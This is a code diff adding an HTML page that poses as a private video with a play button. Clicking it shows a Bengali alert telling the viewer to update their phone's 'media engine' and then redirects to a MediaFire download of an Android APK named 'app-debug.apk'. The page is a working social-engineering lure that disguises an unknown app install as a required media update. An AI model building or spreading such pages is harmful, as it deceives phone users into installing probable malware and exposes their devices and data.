@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private Video</title>
+    <style>
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; margin: 0; }
+        #video-container { position: relative; cursor: pointer; }
+        #video-thumbnail { width: 100%; max-width: 600px; border-radius: 10px; }
+        #play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px;
+            height: 80px;
+            background-color: rgba(0, 0, 0, 0.5);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #play-icon {
+            color: white;
+            font-size: 40px;
+            border-left: 2px solid white;
+            width: 0;
+            height: 40px;
+            border-top: 20px solid transparent;
+            border-bottom: 20px solid transparent;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div id="video-container" onclick="downloadPlugin()">
+        <img id="video-thumbnail" src="https://ibb.co.com/2YyMbtyK" alt="Video Thumbnail">
+        <div id="play-button">
+            <div id="play-icon"></div>
+        </div>
+    </div>
+
+    <script>
+        function downloadPlugin() {
+            alert("ভিডিওটি দেখার জন্য আপনার ফোনের মিডিয়া ইঞ্জিন আপডেট করুন।");
+            window.location.href = "https://www.mediafire.com/file/exvbgxv650d8agd/app-debug.apk/file";
+        }
+    </script>
+</body>
+</html>
